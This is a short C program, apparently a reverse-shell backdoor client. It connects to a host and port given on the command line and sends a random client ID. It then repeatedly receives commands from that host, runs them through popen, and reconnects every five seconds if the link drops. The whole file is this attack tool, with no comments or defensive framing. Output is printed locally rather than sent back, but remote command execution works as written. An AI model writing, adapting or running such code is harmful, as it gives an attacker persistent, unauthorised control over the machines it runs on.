#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>

#define BUFFER_SIZE 1024

int sockfd;
char client_id[9];

void error(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

void generate_random_id(char *s, const int len) {
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";

    for (int i = 0; i < len; ++i) {
        s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
    }

    s[len] = 0;
}

void *shell(void *socket_desc) {
    char buffer[BUFFER_SIZE];
    memset(buffer, 0, BUFFER_SIZE);

    while(1) {
        if (recv(sockfd, buffer, BUFFER_SIZE, 0) < 0) {
            error("Failed to read from socket");
        }

        if (strncmp(buffer, "exit", 4) == 0) {
            break;
        }

        FILE *fp = popen(buffer, "r");
        if (fp == NULL) {
            error("Failed to run command");
        }

        while (fgets(buffer, sizeof(buffer)-1, fp) != NULL) {
            printf("%s", buffer);
        }

        pclose(fp);
    }

    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr,"usage: %s hostname port\n", argv[0]);
        exit(1);
    }

    struct sockaddr_in server;
    pthread_t shell_thread;

    generate_random_id(client_id, 8);

    while(1) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            error("Failed to create socket");
        }

        server.sin_addr.s_addr = inet_addr(argv[1]);
        server.sin_family = AF_INET;
        server.sin_port = htons(atoi(argv[2]));

        if (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) < 0) {
            error("Failed to connect to server");
        }

        if (send(sockfd, client_id, strlen(client_id), 0) < 0) {
            error("Failed to send client ID to server");
        }

        if (pthread_create(&shell_thread, NULL, shell, NULL) < 0) {
            error("Failed to create thread");
        }

        pthread_join(shell_thread, NULL);

        close(sockfd);
        sleep(5);
    }

    return 0;
}
